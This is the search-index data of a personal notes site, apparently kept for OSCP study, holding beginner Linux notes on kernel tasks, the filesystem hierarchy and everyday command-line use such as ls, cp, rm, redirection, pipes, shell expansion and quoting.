{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"subhanaka la ilmalana illa ma allamtana \"In the search for knowledge, the first step is silence, the second to listen, the third to remember, the fourth to practice and the fifth to teach others.\" \ud83d\udcd8 Notes Index Shortcut Keys Key shift + h - Home Key shift + o - OSCP Key shift + p - Programming Key F9 - Search","title":"Home"},{"location":"#notes_index","text":"Shortcut Keys Key shift + h - Home Key shift + o - OSCP Key shift + p - Programming Key F9 - Search","title":"\ud83d\udcd8 Notes Index"},{"location":"linux/linux-fundamentals/","text":"Linux Fundamentals Linux Kernel Ensures coordination between hardware and software role includes managing hardware, processes, users, permissions and file systems provides a common base to all other programs on the systems Kernel space - space where the kernel runs a.k.a ring zero User space - everything that happens outside of the kernel Linux Kernel Tasks Driving Hardware controls the computer's hardware components makes the hardware available to higher-level software kernel exports data about detected hardware thru the /proc and /sys virtual file systems applications access devices by way of files created within the /dev folder Specific files represent disk drives partitions - /dev/sda /dev/sda1 mice - /dev/input/mouse0 keyboards - /dev/input/event0 sound cards - /dev/snd/* serial ports - /dev/ttyS* There are two types of device files - block and character block has characteristics of a block of data has finite size and bytes can be accesses anywhere in the block character behaves like a flow of characters can read and write characters but cannot seek a given position and change arbitrary bytes To inspect the type of the given device file, inspect the first letter in the output ls -l It is either b , for block devices, or c , for character devices 1 2 3 $ ls -l /dev/sda /dev/ttyS0 brw-rw---- 1 root disk 8 , 0 Mar 21 08 :44 /dev/sda crw-rw---- 1 root dialout 4 , 64 Mar 30 08 :59 /dev/ttyS0 Unifying File Systems unix like systems merge all the file stores into a single hierarchy users and applications access data by knowing its location starting point of this hierarchy is called root ( \\ ) kernel translates this naming system and the storage location on the disk even if other disks are mounted, it will be in the single hierarchy many file system formats supported - ext2, ext3, ext4 other file systems also supported - vfat to make a file system, run the command mkfs.ext3 other file systems like nfs (Network File System) files are not stored locally but in the network on a server Managing Processes a process is a running instance of a program requires memory to store program and the operating data when a program runs kernel sets aside some memory loads the executable code from the file system starts the code running the process is tracked by a process identifier (PID) kernel supports multi-taksing; multiple processes run at the same time kernel divides CPU time into small slices and runs each process in turn high-priority processes will run for longer periods and with more frequent time slices than low-priority processes kernel allows several independent instances of the same program to run though only its own time slices and memory are allowed to access the data remains independent Rights Management unix like systems support multiple users and groups and allows control of permissions a process is identified by the user who started it the process is only permitted to take actions permitted for its owner e.g. opening a file requires the kernel to check the process identity against access permissions The Command Line The default shell provided in Kali Linux is Bash ( Bourne Again SHell). The trailing $ or # character indicates that the shell is awaiting your input. It also indicates whether Bash recognizes you as a normal user (the former case with the dollar) or as a super user (the latter case with the hash). The File System The Filesystem Hierarchy Standard Kali linux follows the Filesystem Hierarchy Standard (FHS) defines the purpose of each directory the top level directories are /bin/ basic programs /boot/ Kali Linux kernel and other files required for its early boot process /dev/ device files /etc/ configuration files /home/ user\u2019s personal files /lib/ basic libraries /media/* mount points for removable devices (CD-ROM, USB keys, and so on) /mnt/ temporary mount point /opt/ extra applications provided by third parties /root/ administrator\u2019s (root\u2019s) personal files /sbin/ system programs /srv/ data used by servers hosted on this system /tmp/ temporary files (this directory is often emptied at boot) /var/ variable data handled by daemons. This includes log files, queues, spools, and caches. /proc/ and /sys/ are specific to the Linux kernel (and not part of the FHS). They are used by the kernel for exporting data to user space. /run/ volatile runtime data that does not persist across reboots (not yet included in the FHS) /usr/ applications (this directory is further subdivided into bin , sbin , lib according to the same logic as in the root directory) Furthermore, /usr/share/ contains architecture independent data. The /usr/local/ directory is meant to be used by the administrator for installing applications manually without overwriting files handled by the packaging system (dpkg). The User\u2019s Home Directory","title":"Linux Fundamentals"},{"location":"linux/linux-fundamentals/#linux_fundamentals","text":"","title":"Linux Fundamentals"},{"location":"linux/linux-fundamentals/#linux_kernel","text":"Ensures coordination between hardware and software role includes managing hardware, processes, users, permissions and file systems provides a common base to all other programs on the systems Kernel space - space where the kernel runs a.k.a ring zero User space - everything that happens outside of the kernel","title":"Linux Kernel"},{"location":"linux/linux-fundamentals/#linux_kernel_tasks","text":"","title":"Linux Kernel Tasks"},{"location":"linux/linux-fundamentals/#driving_hardware","text":"controls the computer's hardware components makes the hardware available to higher-level software kernel exports data about detected hardware thru the /proc and /sys virtual file systems applications access devices by way of files created within the /dev folder Specific files represent disk drives partitions - /dev/sda /dev/sda1 mice - /dev/input/mouse0 keyboards - /dev/input/event0 sound cards - /dev/snd/* serial ports - /dev/ttyS* There are two types of device files - block and character block has characteristics of a block of data has finite size and bytes can be accesses anywhere in the block character behaves like a flow of characters can read and write characters but cannot seek a given position and change arbitrary bytes To inspect the type of the given device file, inspect the first letter in the output ls -l It is either b , for block devices, or c , for character devices 1 2 3 $ ls -l /dev/sda /dev/ttyS0 brw-rw---- 1 root disk 8 , 0 Mar 21 08 :44 /dev/sda crw-rw---- 1 root dialout 4 , 64 Mar 30 08 :59 /dev/ttyS0","title":"Driving Hardware"},{"location":"linux/linux-fundamentals/#unifying_file_systems","text":"unix like systems merge all the file stores into a single hierarchy users and applications access data by knowing its location starting point of this hierarchy is called root ( \\ ) kernel translates this naming system and the storage location on the disk even if other disks are mounted, it will be in the single hierarchy many file system formats supported - ext2, ext3, ext4 other file systems also supported - vfat to make a file system, run the command mkfs.ext3 other file systems like nfs (Network File System) files are not stored locally but in the network on a server","title":"Unifying File Systems"},{"location":"linux/linux-fundamentals/#managing_processes","text":"a process is a running instance of a program requires memory to store program and the operating data when a program runs kernel sets aside some memory loads the executable code from the file system starts the code running the process is tracked by a process identifier (PID) kernel supports multi-taksing; multiple processes run at the same time kernel divides CPU time into small slices and runs each process in turn high-priority processes will run for longer periods and with more frequent time slices than low-priority processes kernel allows several independent instances of the same program to run though only its own time slices and memory are allowed to access the data remains independent","title":"Managing Processes"},{"location":"linux/linux-fundamentals/#rights_management","text":"unix like systems support multiple users and groups and allows control of permissions a process is identified by the user who started it the process is only permitted to take actions permitted for its owner e.g. opening a file requires the kernel to check the process identity against access permissions","title":"Rights Management"},{"location":"linux/linux-fundamentals/#the_command_line","text":"The default shell provided in Kali Linux is Bash ( Bourne Again SHell). The trailing $ or # character indicates that the shell is awaiting your input. It also indicates whether Bash recognizes you as a normal user (the former case with the dollar) or as a super user (the latter case with the hash).","title":"The Command Line"},{"location":"linux/linux-fundamentals/#the_file_system","text":"","title":"The File System"},{"location":"linux/linux-fundamentals/#the_filesystem_hierarchy_standard","text":"Kali linux follows the Filesystem Hierarchy Standard (FHS) defines the purpose of each directory the top level directories are /bin/ basic programs /boot/ Kali Linux kernel and other files required for its early boot process /dev/ device files /etc/ configuration files /home/ user\u2019s personal files /lib/ basic libraries /media/* mount points for removable devices (CD-ROM, USB keys, and so on) /mnt/ temporary mount point /opt/ extra applications provided by third parties /root/ administrator\u2019s (root\u2019s) personal files /sbin/ system programs /srv/ data used by servers hosted on this system /tmp/ temporary files (this directory is often emptied at boot) /var/ variable data handled by daemons. This includes log files, queues, spools, and caches. /proc/ and /sys/ are specific to the Linux kernel (and not part of the FHS). They are used by the kernel for exporting data to user space. /run/ volatile runtime data that does not persist across reboots (not yet included in the FHS) /usr/ applications (this directory is further subdivided into bin , sbin , lib according to the same logic as in the root directory) Furthermore, /usr/share/ contains architecture independent data. The /usr/local/ directory is meant to be used by the administrator for installing applications manually without overwriting files handled by the packaging system (dpkg).","title":"The Filesystem Hierarchy Standard"},{"location":"linux/linux-fundamentals/#the_users_home_directory","text":"","title":"The User\u2019s Home Directory"},{"location":"linux/linux_cmd/","text":"The Linux Command Line Basics NAVIGATION View the files of a folder 1 2 root@kali:~# ls Desktop view all the files including the hidden directories 1 root@kali:~# ls -a listing a directory 1 root@kali:~# ls /usr listing a directory with more details 1 root@kali:~# ls -l listing a directory and sort the result 1 root@kali:~# ls -lt listing a directory and reverse sorting the result 1 root@kali:~# ls -lt --reverse see the current directory 1 2 root@kali:~# pwd /root changing the directory 1 2 3 root@kali:~/Desktop# cd .. root@kali:~/# cd ../etc root@kali:/etc# Note cd - changes the working directory to the previous working directory cd ~username - changes the working directory to the home directory of the user_name help 1 root@kali:~# man ls File and Navigation Summary Option Long option Description -a --all List all files, even those with names that begin with a period, which are normally not listed (that is, hidden). -A --almost-all Like the -a option except it does not list . (current directory) and ..(parent directory). -d --directory Ordinarily, if a directory is specified, ls will list the contents of the directory, not the directory itself. Use this option in conjunction with the -l option to see details about the directory rather than its contents. -F --classify This option will append an indicator character to the end of each listed name. For example, it will append a forward slash (/) if the name is a directory. -h --human-readable In long format listings, display file sizes in human-readable format rather than in bytes. -l Display results in long format. -r --reverse Display the results in reverse order. Normally, ls displays its results in ascending alphabetical order. -S Sort results by file size. -t Sort by modification time. --- EXPLORING FILES Determining a file's type syntax: file _filename_ 1 2 root@kali:~# file bookudp.xml bookudp.xml: XML 1.0 document, ASCII text, with very long lines Viewing File Contents With Less less command is used to view file contents syntax: less _filename_ 1 2 3 root@kali:~# less /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin Less Commands Command Action PAGE UP or b Scroll back one page PAGE DOWN or space Scroll forward one page Up arrow Scroll up one line Down arrow Scroll down one line G Move to the end of the text file 1G or g Move to the beginning of the text file /characters Search forward to the next occurrence of characters n Search for the next occurrence of the previous search h Display help screen q Quit less Copy Paste Using Mouse If you are using a mouse, you can double-click a filename to copy it and middle-click to paste it into commands. Symbolic Links also called as soft link or symlink Example 1 lrwxrwxrwx 1 root root 11 2018-08-11 07:34 libc.so.6 -> libc-2.6.so Programs looking for libc.so.6 will actually get the file libc-2.6.so . MANIPULATING FILES AND DIRECTORIES Wildcards Wildcards are special characters to help rapidly specify groups of filenames. Wildcard Meaning * Matches any characters ? Matches any single character [characters] Matches any character that is a member of the set characters [!characters] Matches any character that is not a member of the set characters [[:class:]] Matches any character that is a member of the specified class Commonly Used Character Classes Character class Meaning [:alnum:] Matches any alphanumeric character [:alpha:] Matches any alphabetic character [:digit:] Matches any numeral [:lower:] Matches any lowercase letter [:upper:] Matches any uppercase letter Wildcard Examples Pattern Matches * All files g* Any file beginning with g b*.txt Any file beginning with b followed by any characters and ending with .txt Data??? Any file beginning with Data followed by exactly three characters [abc]* Any file beginning with either an a, a b, or a c BACKUP.[0-9][0-9][0-9] Any file beginning with BACKUP. followed by exactly three numerals [[:upper:]]* Any file beginning with an uppercase letter [![:digit:]]* Any file not beginning with a numeral *[[:lower:]123] Any file ending with a lowercase letter or the numerals 1, 2, or 3 File Manipulation Copy Files and Directories 1 cp item1 item2 copies the single file or directory item1 to the file or directory item2 1 cp item... directory copies multiple items (either files or directories) into a directory Copy Options Option Meaning -a, --archive Copy the files and directories and all of their attributes, including ownerships and permissions. -i, --interactive Before overwriting an existing file, prompt the user for confirmation. If this option is not specified, cp will silently (meaning there will be no warning) overwrite files. -r, --recursive Recursively copy directories and their contents. This option (or the -a option) is required when copying directories. -u, --update When copying files from one directory to another, only copy files that either don\u2019t exist or are newer than the existing corresponding files in the destination directory. This is useful when copying large numbers of files as it skips files that don\u2019t need to be copied. -v, --verbose Display informative messages as the copy is performed. Copy Examples Command Results cp file1 file2 Copy file1 to file2 . If file2 exists, it is overwritten with the contents of file1 . If _file2_does not exist, it is created. cp -i file1 file2 Same as previous command, except that if file2 exists, the user is prompted before it is overwritten. cp file1 file2 dir1 Copy file1 and file2 into directory dir1 . The directory dir1 must already exist. cp dir1 /* dir2 Using a wildcard, copy all the files in dir1 into dir2 . The directory dir2 must already exist. cp -r dir1 dir2 Copy the contents of directory dir1 to directory dir2 . If directory dir2 does not exist, it is created and, after the copy, will contain the same contents as directory dir1 . If directory dir2 does exist, then directory dir1 (and its contents) will be copied into dir2 . Move Files and Directories 1 mv item1 item2 move or rename the file or directory item1 to item2 1 mv _item..._ _directory_ move one or more items from one directory to another. Move Options Option Meaning -i, --interactive Before overwriting an existing file, prompt the user for confirmation. If this option is not specified, mv will silently overwrite files. -u, --update When moving files from one directory to another, only move files that either don\u2019t exist or are newer than the existing corresponding files in the destination directory. -v, --verbose Display informative messages as the move is performed. Move Examples Command Results mv file1 file2 Move file1 to file2 . If file2 exists, it is overwritten with the contents of file1 . If file2_does not exist, it is created. In either case, _file1 ceases to exist. mv -i file1 file2 Same as the previous command, except that if file2 exists, the user is prompted before it is overwritten. mv file1 file2 dir1 Move file1 and file2 into directory dir1 . The directory dir1 must already exist. mv dir1 dir2 If directory dir2 does not exist, create directory dir2 and move the contents of directory dir1 into dir2 and delete directory dir1 . If directory dir2 does exist, move directory dir1 (and its contents) into directory dir2 . Remove Files and Directories the rm command is used to remove (delete) files and directories 1 root@kali:~# rm item Remove options Option Meaning -i, --interactive Before deleting an existing file, prompt the user for confirmation. If this option is not specified, rm will silently delete files. -r, --recursive Recursively delete directories. This means that if a directory being deleted has subdirectories, delete them too. To delete a directory, this option must be specified. -f, --force Ignore nonexistent files and do not prompt. This overrides the --interactive option. -v, --verbose Display informative messages as the deletion is performed. Remove Examples Command Results rm file1 Delete file1 silently. rm -i file1 Same as the previous command, except that the user is prompted for confirmation before the deletion is performed. rm -r file1 dir1 Delete file1 and dir1 and its contents. rm -rf file1 dir1 Same as the previous command, except that if either file1 or dir1 does not exist, rm will continue silently. Hard link and Symbolic Links ln command is used to create either hard or symbolic links. The following creates a hard link syntax: ln file link The following creates a symbolic link syntax: ln -s item link Hard Links A hard link is not distinguishable from the file itself. When a directory is listed, there is no special indication of the link itself. When it is deleted, the link is removed but the contents of the file will remain intact. A hard link cannot reference a directory. When thinking about hard links, it is helpful to imagine that files are made up of two parts. The data part containing the file\u2019s contents The name part that holds the file\u2019s name When we create hard links, we are actually creating additional name parts that all refer to the same data part. The system assigns a chain of disk blocks to what is called an inode , which is then associated with the name part. Each hard link therefore refers to a specific inode containing the file\u2019s contents. 1 2 3 4 5 6 root@kali:~# ls -li total 16 1990646 drwxr-xr-x 2 root root 4096 May 26 07:39 dir1 1990972 drwxr-xr-x 2 root root 4096 May 26 07:40 dir2 1985856 -rw-r--r-- 4 root root 3255 May 26 07:30 fun 1985856 -rw-r--r-- 4 root root 3255 May 26 07:30 fun-hard Symbolic Links Symbolic links are a special type of file that contains a text pointer to the referenced file or directory if the symbolic link is written to, the original file is written. if the link is deleted, the file will remain intact. 1 2 3 4 5 6 root@kali:~# ls -l total 12 drwxr-xr-x 2 root root 4096 May 26 07:45 dir1 drwxr-xr-x 2 root root 4096 May 26 07:46 dir2 -rw-r--r-- 3 root root 3256 May 26 07:44 fun lrwxrwxrwx 1 root root 3 May 26 07:45 fun-sym -> fun symbolic links are identified by the leading letter l WORKING WITH COMMANDS linux allows us to create our own commands A command can be one of the four following things An executable program - e.g. programs in /usr/bin A Shell builtin - e.g. cd A Shell function - e.g. shell scripts An Alias - e.g command defined by the user Identifying Commands type command displays the kind of command the shell will execute, given a particular command name syntax: type <command> 1 2 3 4 5 6 root@kali:# type type type is a shell builtin root@kali:# type ls ls is aliased to 'ls --color=auto' root@kali:# type cp cp is hashed ( /bin/cp ) which command Displays an executable's location works only for executable programs and not shell builtins syntax: which <executable> 1 2 root@kali:# which ls /bin/ls 1 root@kali:# which cd When which is used on a shell builtin like cd , it either displays blank or displays an error message Getting a command's documentation help command 1 2 3 4 5 6 7 root@kali:# help cd cd: cd [ -L | [ -P [ -e ]] [ -@ ]] [ dir ] Change the shell working directory. Change the current directory to DIR. The default DIR is the value of the HOME shell variable. _snip_ Note cd [-L|[-P[-e]]] [dir] The above notation says that the command cd may be followed optionally by either a -L or a -P and further, if the -P option is specified the -e option may also be included followed by the optional argument dir --help Display usage info 1 2 3 4 5 6 7 root@kali:~# mkdir --help Usage: mkdir [OPTION] DIRECTORY... Create the DIRECTORY(ies), if they do not already exist. -Z, --context=CONTEXT (SELinux) set security context to CONTEXT Mandatory arguments to long options are mandatory for short options too. _snip_ man - Display a Program's Manual Page syntax: man <command> 1 root@kali:# man ls Man Page Organization Section Contents 1 User commands 2 Programming interfaces for kernel system calls 3 Programming interfaces to the C library 4 Special files such as device nodes and drivers 5 File formats 6 Games and amusements such as screen savers 7 Miscellaneous 8 System administration commands to search a particular section syntax: man <section> <search_term> 1 root@kali:# man 5 passwd This will display the man page describing the file format of the /etc/passwd file. apropos - display appropriate commands syntax: apropos <part of command / description> 1 2 3 4 5 6 7 root@kali:# apropos passwd chgpasswd ( 8 ) - update group passwords in batch mode chpasswd ( 8 ) - update passwords in batch mode exim4_passwd ( 5 ) - Files in use by the Debian exim4 packages exim4_passwd_client ( 5 ) - Files in use by the Debian exim4 packages expect_mkpasswd ( 1 ) - generate new password, optionally apply it to a user ... Creating Own Commands With Alias It\u2019s possible to put more than one command on a line by separating each command with a semicolon. syntax: command1; command2; command3 alias syntax syntax: alias <aliasname>=<string> 1 root @ kali : # alias foo = 'cd /usr; ls; cd -' using the alias 1 2 3 root@kali:~# foo bin games include lib local sbin share src /home/me removing the alias 1 root@kali:# unalias foo view all aliases 1 2 3 4 root@kali:# alias alias l.='ls -d .* --color=tty' alias ll='ls -l --color=tty' alias ls='ls --color=tty' I/O REDIRECTION The \u201cI/O\u201d stands for input/output, and with this facility you can redirect the input and output of commands Redirecting Standard Output syntax: <command> > <filename> 1 root@kali:# ls -l /usr/bin > ls-output.txt error get written to the screen and not the file 1 2 root@kali:# ls -l /bin/usr > ls-output.txt ls: cannot access /bin/usr: No such file or directory other way to create a file 1 root@kali:# > ls-output.txt Simply using the redirection operator with no command preceding it will truncate an existing file or create a new, empty file. append redirected output instead of overwriting a file 1 root@kali:# ls -l /usr/bin >> ls-output.txt Using the >> operator will result in the output being appended to the file. Redirecting Standard Error root@kali:# ls -l /bin/usr 2> ls-error.txt The file descriptor 2 is placed immediately before the redirection operator to perform the redirection of standard error to the file ls-error.txt . Redirecting Standard Output and Standard Error to One File 1 root@kali:# ls -l /bin/usr > ls-output.txt 2>&1 First we redirect standard output to the file ls-output.txt , and then we redirect file descriptor 2 (standard error) to file descriptor 1 (standard output) using the notation 2>&1. Order of the Redirections Matter If the order is changed to the following, then standard error is directed to the screen 2>&1 >ls-output.txt Modern Versions of Redirection 1 root@kali:~# ls -l /bin/usr &> ls-output.txt appending standard output and standard error streams to a single file 1 root@kali:~# ls -l /bin/usr &>> ls-output.txt Disposing Unwanted Output 1 root@kali:# ls -l /bin/usr 2> /dev/null Output is sent to a special file called /dev/null . This file is a system device often referred to as a bit bucket , which accepts input and does nothing with it. Redirecting Standard Input Cat - Concatenate Files syntax: cat <filename> multiple filenames can be joined to one single file syntax: cat filenames > <new file name> e.g. there are multiple filenames like this filename1, filename2, filename3 etc, the same can be concatenated to a single filename with the following command 1 cat filename* > filename PIPELINES syntax: command 1 | command 2 1 root@kali:# ls -l /usr/bin | less Filters Pipelines are often used to perform complex operations on data. It is possible to put several commands together into a pipeline. Frequently, the commands used this way are referred to as filters . Sort - Sorting Lines 1 root@kali:# ls /bin /usr/bin | sort | less Uniq - Report or Omit Repeated Lines 1 root@kali:# ls /bin /usr/bin | sort | uniq | less In this example, we use uniq to remove any duplicates from the output of the sort command. If we want to see the list of duplicates instead, we add the -d option to uniq like so 1 root@kali:# ls /bin /usr/bin | sort | uniq -d | less WC - Print Line, Word and Byte Counts The wc (word count) command is used to display the number of lines, words, and bytes contained in files. 1 2 root@kali:# wc ls-output.txt 7902 64566 503634 ls-output.txt to see the number of items in a sorted list, the following command can be used 1 2 root@kali:# ls /bin /usr/bin | sort | uniq | wc -l 2500 Grep - Print Lines Matching A Pattern syntax: grep <pattern> <filename> 1 2 3 4 5 6 7 8 9 10 11 12 root@kali:# ls /bin /usr/bin | sort | uniq | grep zip bunzip2 bzip2 gunzip gzip unzip zip zipcloak zipgrep zipinfo zipnote zipsplit grep flags -i for ignoring the case when performing the search -v for grep to print only the lines that do not match the pattern head/tail - Print First/Last Part of Files The head command prints the first 10 lines of a file, and the tail command prints the last 10 lines. By default, both commands print 10 lines of text, but this can be adjusted with the -n option. syntax: head <no of lines><filename> 1 2 3 4 5 6 root@kali:# head -n 5 ls-output.txt total 343496 -rwxr-xr-x 1 root root 31316 2017-12-05 08:58 [ -rwxr-xr-x 1 root root 8240 2017-12-09 13:39 411toppm -rwxr-xr-x 1 root root 111276 2017-11-26 14:27 a2p -rwxr-xr-x 1 root root 25368 2016-10-06 20:16 a52dec syntax: tail <no of lines><filename> 1 2 3 4 5 6 root@kali:# tail -n 5 ls-output.txt -rwxr-xr-x 1 root root 5234 2017-06-27 10:56 znew -rwxr-xr-x 1 root root 691 2015-09-10 04:21 zonetab2pot.py -rw-r--r-- 1 root root 930 2017-11-01 12:23 zonetab2pot.pyc -rw-r--r-- 1 root root 930 2017-11-01 12:23 zonetab2pot.pyo lrwxrwxrwx 1 root root 6 2016-01-31 05:22 zsoelim -> soelim can be used in pipelines 1 2 3 4 5 6 root@kali:# ls /usr/bin | tail -n 5 znew zonetab2pot.py zonetab2pot.pyc zonetab2pot.pyo zsoelim viewing files in real time using tail tail has an option that allows you to view files in real time. This is useful for watching the progress of log files as they are being written. 1 2 3 4 root@kali:# tail -f /var/log/messages Feb 8 13:40:05 twin4 dhclient: DHCPACK from 192.168.1.1 Feb 8 13:40:05 twin4 dhclient: bound to 192.168.1.4 -- renewal in 1652 seconds. Feb 8 13:55:32 twin4 mountd[3953]: /var/NFSv4/musicbox exported to both 192.168.1.0/24 and Using the -f option, tail continues to monitor the file, and when new lines are appended, they immediately appear on the display. This continues until you type CTRL-C . Tee - Read from Stdin and Output to Stdout and Files The tee command reads standard input and copies it to both standard output (allowing the data to continue down the pipeline) and to one or more files. 1 2 3 4 5 root@kali:# ls /usr/bin | tee ls.txt | grep zip bunzip2 bzip2 gunzip gzip tee captures the entire directory listing to the file ls.txt before grep filters the pipeline\u2019s contents TEXT EXPANSION Each type a command is typed and pressed Enter key, bash performs several substitutions on the text before the command is executed. The process is called as expansion echo is a shell builtin command that prints text arguments on standard output 1 2 root@kali:# echo this is a test this is a test any argument passed to echo gets displayed on the screen 1 2 root@kali:# echo * 0 bin boot dev etc home initrd.img initrd.img.old lib lib64 lost+found media mnt opt proc root run sbin srv sys tmp usr var vmlinuz vmlinuz.old Note echo didn't print the star as * is expanded by the shell automatically Pathname Expansion pathname expansion - the mechanism by which wildcards work Examples 1 2 root@kali:# echo D* Desktop Documents 1 2 root@kali:# echo *s Documents Pictures Templates Videos 1 2 root@kali:# echo [[:upper:]]* Desktop Documents Music Pictures Public Templates Videos 1 2 root@kali:# echo /usr/*/share /usr/local/share Pathname Expansion Of Hidden Files show all hidden directories with echo 1 2 root@kali:# echo .* . .. .cache show only the valid directories with echo 1 2 root@kali:# echo .[!.]* .cache Tilde Expansion the tilde character ( ~ ) has a special meaning when used at the beginning of the word, it denotes the home directory 1 2 root@kali:# echo ~ /home/me if the user foo has an account, it expands to 1 2 root@kali:# echo ~foo /home/foo Arithmetic Expansion Shell allows arithmetic expansion to be performed. Use the shell prompt as a calculator syntax: $((expression)) where expression is an arithmetic expression consisting of values and arithmetic operators. 1 2 root@kali:# echo $((2 + 2)) 4 Arithmetic Operators Operator Description + Addition - Subtraction * Multiplication / Division (but remember, since expansion supports only integer arithmetic, results are integers) % Modulo, which simply means \u201cremainder\u201d ** Exponentiation Note Spaces are not significant in Arithmetic expressions and expressions may be nested 1 2 root@kali:# echo $(($((5**2)) * 3)) 75 Single parentheses may be used to group multiple subexpressions. 1 2 root@kali:# echo $(((5**2) * 3)) 75 Effect of division will always return integers 1 2 3 4 root@kali:# echo Five divided by two equals $((5/2)) Five divided by two equals 2 root@kali:# echo with $((5%2)) left over. with 1 left over. Brace Expansion With Preamble and Postscript 1 2 root@kali:# echo Front-{A,B,C}-Back Front-A-Back Front-B-Back Front-C-Back - Patterns to be brace expanded may contain a leading portion called a preamble and a trailing portion called a postscript . The brace expression itself may contain either a comma-separated list of strings or a range of integers or single characters. The pattern may not contain unquoted whitespace. Brace Expansion With Ranges 1 2 root@kali:# echo Number_{1..5} Number_1 Number_2 Number_3 Number_4 Number_5 With Padded Numbers 1 2 3 4 root@kali:# echo {01..15} 01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 root@kali:# echo {001..15} 001 002 003 004 005 006 007 008 009 010 011 012 013 014 015 range of letters in reverse order 1 2 root@kali:# echo {Z..A} Z Y X W V U T S R Q P O N M L K J I H G F E D C B A Nested Brace Expansions 1 2 root@kali:# echo a{A{1,2},B{3,4}}b aA1b aA2b aB3b aB4b Making directories with year-month at once 1 2 3 4 5 6 7 root@kali:# mkdir {2007..2009}-{01..12} 2007-01 2007-07 2008-01 2008-07 2009-01 2009-07 2007-02 2007-08 2008-02 2008-08 2009-02 2009-08 2007-03 2007-09 2008-03 2008-09 2009-03 2009-09 2007-04 2007-10 2008-04 2008-10 2009-04 2009-10 2007-05 2007-11 2008-05 2008-11 2009-05 2009-11 2007-06 2007-12 2008-06 2008-12 2009-06 2009-12 Parameter Expansion in linux, variables can be declared the variables can be called using parameter expansion 1 2 root@kali:# echo $USER root View available variables 1 root@kali:# printenv | less With parameter expansion, if the variable is mis-spelled, the expansion will still take place but will result in an empty string. 1 2 3 root@kali:# echo $USER1 root@kali:# Command Substitution Command substitution allows us to use the output of a command as an expansion. 1 2 root@kali:# echo $(ls) Desktop Documents Music Pictures Public Templates Videos 1 2 root@kali:# ls -l $(which cp) -rwxr-xr-x 1 root root 71516 2007-12-05 08:58 /bin/cp Entire pipelines can be used 1 2 3 4 5 root@kali:# file $(ls -d /usr/bin/* | grep zip) /usr/bin/bunzip2: symbolic link to `bzip2' /usr/bin/bzip2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.9, stripped /usr/bin/bzip2recover: ELF 32-bit LSB executable, Intel 80386, version 1 older syntax 1 2 root@kali:# ls -l `which cp` -rwxr-xr-x 1 root root 71516 2007-12-05 08:58 /bin/cp QUOTING 1 2 root@kali:# echo this is a test this is a test 1 2 root@kali:# echo The total is $100.00 The total is 00.00 In the first example, word splitting by the shell removed extra whitespace from the echo command\u2019s list of arguments. In the second example, parameter expansion substituted an empty string for the value of $1 because it was an undefined variable. Double Quotes If we place text inside double quotes, all the special characters used by the shell lose their special meaning and are treated as ordinary characters. When double quotes is used, it will suppress word splitting tilde expressions brace expression it will not suppress parameter expansion arithmetic expansion command substitution 1 2 3 root@kali:# ls -l two words.txt ls: cannot access two: No such file or directory ls: cannot access words.txt: No such file or directory Use double quotes to stop the word splitting and get the desired result 1 2 3 root@kali:# ls -l \"two words.txt\" -rw-rw-r-- 1 me me 18 2018-02-20 13:03 two words.txt root@kali:# mv \"two words.txt\" two_words.txt Parameter expansion, arithmetic expansion, command substitution will work` 1 2 3 4 5 6 7 8 root@kali:# echo \"$USER $((2+2)) $(cal)\" me 4 February 2020 Su Mo Tu We Th Fr Sa 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 Single Quotes If we need to suppress all expansions, we use single quotes . 1 2 3 4 5 6 root@kali:# echo text ~/*.txt { a,b } $( echo foo ) $(( 2 + 2 )) $USER text /home/root/ls-output.txt a b foo 4 root root@kali:# echo \"text ~/*.txt {a,b} $( echo foo ) $(( 2 + 2 )) $USER \" text ~/*.txt { a,b } foo 4 root root@kali:# echo 'text ~/*.txt {a,b} $(echo foo) $((2+2)) $USER' text ~/*.txt { a,b } $( echo foo ) $(( 2 + 2 )) $USER Escaping Characters to quote only a single character, precede the character with a backslash ( \\ ) 1 2 root@kali:# echo \"The balance for user $USER is: \\$5.00\" The balance for user root is: $5.00 renaming a bad filename (the one with an & or $ or !) 1 root@kali:# mv bad\\&filename good_filename Backslash Escape Sequences Escape sequence Meaning \\a Bell (an alert that causes the computer to beep) \\b Backspace \\n Newline; on Unix-like systems, this produces a line feed \\r Carriage return \\t Tab Adding the -e option to echo will enable interpretation of escape sequences 1 root @ kali : # sleep 10 ; echo -e \"Time's up\\a\" ADVANCED KEYBOARD TRICKS Cursor Movement Key Action CTRL-A Move cursor to the beginning of the line. CTRL-E Move cursor to the end of the line. CTRL-F Move cursor forward one character; same as the right arrow key. CTRL-B Move cursor backward one character; same as the left arrow key. ALT-F Move cursor forward one word. ALT-B Move cursor backward one word. CTRL-L Clear the screen and move the cursor to the top-left corner. The clear command does the same thing. Modifying Text Key Action CTRL-D Delete the character at the cursor location. CTRL-T Transpose (exchange) the character at the cursor location with the one preceding it. ALT-T Transpose the word at the cursor location with the one preceding it. ALT-L Convert the characters from the cursor location to the end of the word to lowercase. ALT-U Convert the characters from the cursor location to the end of the word to uppercase. Cutting and Pasting Text Key Action CTRL-K Kill text from the cursor location to the end of line. CTRL-U Kill text from the cursor location to the beginning of the line. ALT-D Kill text from the cursor location to the end of the current word. ALT-BACKSPACE Kill text from the cursor location to the beginning of the current word. If the cursor is at the beginning of a word, kill the previous word. CTRL-Y Yank text from the kill-ring and insert it at the cursor location. Completion Display a list of possible combinations press TAB twice Using History Key Action CTRL-P Move to the previous history entry. This is the same action as the up arrow. CTRL-N Move to the next history entry. This is the same action as the down arrow. ALT-< Move to the beginning (top) of the history list. ALT-> Move to the end (bottom) of the history list, i.e., the current command line. CTRL-R Reverse incremental search. This searches incrementally from the current command line up the history list. ALT-P Reverse search, nonincremental. With this key, type in the search string and press ENTER before the search is performed. ALT-N Forward search, nonincremental. CTRL-O Execute the current item in the history list and advance to the next one. This is handy if you are trying to re-execute a sequence of commands in the history list. History Expansion Sequence Action !! Repeat the last command. It is probably easier to press the up arrow and ENTER. !number Repeat history list item number. PERMISSIONS Owners, Group Members and Everyone Else 1 2 3 4 user@kali:$ file /etc/shadow /etc/shadow: regular file, no read permissions user@kali:$ less /etc/shadow /etc/shadow: Permission denied find the users identity 1 2 root@kali:# id 